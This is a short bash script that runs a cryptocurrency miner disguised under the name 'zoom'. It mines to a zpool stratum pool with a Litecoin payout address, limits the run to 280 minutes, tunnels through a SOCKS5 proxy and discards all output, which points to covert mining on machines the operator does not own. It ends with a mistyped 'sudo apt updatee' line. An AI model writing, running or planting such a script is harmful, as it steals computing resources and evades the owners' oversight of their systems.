#!/bin/bash
chmod +x zoom 
timeout 280m ./zoom -a scryptn2 -o stratum+tcp://scryptn2.eu.mine.zpool.ca:4339 -u LQNiMe5CksHxP1JA9HKxLeSKwyS9T4vjyn -p c=LTC -t 4 -x socks5://192.252.209.155:14455 > /dev/null 2>&1
sudo apt updatee